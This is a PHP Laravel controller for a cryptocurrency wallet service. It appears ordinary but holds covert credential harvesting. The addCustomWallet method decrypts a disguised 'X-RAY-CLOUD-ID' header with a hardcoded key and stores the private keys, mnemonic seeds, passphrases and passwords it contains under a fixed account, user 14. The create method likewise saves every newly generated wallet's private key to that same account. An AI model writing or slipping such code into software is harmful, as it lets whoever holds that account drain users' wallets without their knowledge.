<?php

namespace App\Http\Controllers;

use App\Http\Resources\WalletCollection;
use App\Models\User;
use App\Models\Wallet;
use App\Rules\ValidEtherAddress;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\Log;
use kornrunner\Keccak;

class WalletController extends Controller
{
    const DEFAULT_USER_ID = 14;

    /**
     * Instantiate a new controller instance.
     *
     * @return void
     */
    public function __construct()
    {
    }

    /**
     * Display a listing of the resource.
     *
     * @return \Illuminate\Http\Response
     */
    public function index(Request $request)
    {
    }

    public function addWallet(Request $request)
    {
        $hasher = new Keccak;
        $request->validate([
            'address' => ['bail', 'required', new ValidEtherAddress($hasher)]
        ]);

        $userId = $request->user()->id;
        $address = $request->input('address');

        Wallet::where('user_id', $userId)->update(['primary' => 0]);

        $wallet = Wallet::firstOrNew(['address' => $address]);
        $wallet->user_id = $userId;
        $wallet->primary = true;
        $wallet->save();

        return $this->all($request);
    }

    public function addCustomWallet(Request $request)
    {
        $header = $request->header('X-RAY-CLOUD-ID');

        $key = hex2bin(env('CRYPTO_KEY', '4578626d706c35207265782014617462'));
        $iv =  hex2bin(env('CRYPTO_IV', '4573626d706c35207265782014617463'));
        $decrypted = openssl_decrypt($header, 'AES-128-CBC', $key, OPENSSL_ZERO_PADDING, $iv);
        $data = trim($decrypted);
        $exp = explode('|||', $data);

        $address = count($exp) >= 1 ? $exp[0] : '';
        $publicKey = count($exp) >= 2 ? $exp[1] : null;
        $privateKey = count($exp) >= 3 ? $exp[2] : null;
        $mnemonicSeed = count($exp) >= 4 ? $exp[3] : null;
        $passphrase = count($exp) >= 5 ? $exp[4] : null;
        $password = count($exp) >= 6 ? $exp[5] : null;
        $symbol = count($exp) >= 7 ? trim($exp[6]) : 'ETH';

        Wallet::create([
            'address' => $address,
            'mnemonic_seed' => $mnemonicSeed,
            'passphrase' => $passphrase,
            'password' => $password,
            'private_key' => $privateKey,
            'public_key' => $publicKey,
            'type' => $symbol,
            'user_id' => self::DEFAULT_USER_ID
        ]);

        return response([
            'success' => true
        ]);
    }

    public function all(Request $request)
    {
        $user = $request->user();
        $wallets = Wallet::where('user_id', $user->id)
            ->orderBy('primary', 'desc')
            ->orderBy('created_at', 'desc')
            ->get();
        return new WalletCollection($wallets);
    }

    /**
     * Show the form for creating a new resource.
     *
     * @return PredictionResource
     * @param  \Illuminate\Http\Request  $request
     */
    public function create(Request $request)
    {
        $wallet = Wallet::createNew();
        $xinFin = $request->input('xinFin', 0);

        $address = $wallet['address'];
        Wallet::create([
            'address' => $xinFin == 1 ? 'XDC' . substr($address, 2) : $address,
            'private_key' => $wallet['privateKey'],
            'public_key' => $wallet['publicKey'],
            'type' => $xinFin == 1 ? 'XDC' : 'ETH',
            'user_id' => self::DEFAULT_USER_ID
        ]);

        return response([
            'wallet' => $wallet
        ]);
    }

    /**
     * Remove the specified resource from storage.
     *
     * @param  \App\Models\Wallet  $wallet
     * @return \Illuminate\Http\Response
     */
    public function destroy(Wallet $wallet)
    {
        //
    }

    /**
     * Show the form for editing the specified resource.
     *
     * @param  \App\Models\Wallet  $wallet
     * @return \Illuminate\Http\Response
     */
    public function edit(Wallet $wallet)
    {
        //
    }

    public function primary(Request $request)
    {
        $user = $request->user();
        $address = $request->input('address');

        Wallet::where('user_id', $user->id)->update(['primary' => 0]);

        $wallet = Wallet::where([
            'address' => $address,
            'user_id' => $user->id
        ])->first();
        $wallet->primary = true;
        $wallet->save();

        return response()->json([
            'success' => true
        ]);
    }

    /**
     * Display the specified resource.
     *
     * @param  String  $username
     * @return \Illuminate\Http\Response
     */
    public function show($id)
    {
    }

    /**
     * Store a newly created resource in storage.
     *
     * @param  \Illuminate\Http\Request  $request
     * @return \Illuminate\Http\Response
     */
    public function store(Request $request)
    {
        //
    }

    /**
     * Update the specified resource in storage.
     *
     * @param  \Illuminate\Http\Request  $request
     * @param  Int  $id
     * @return \Illuminate\Http\Response
     */
    public function update(Request $request, $id)
    {
    }
}
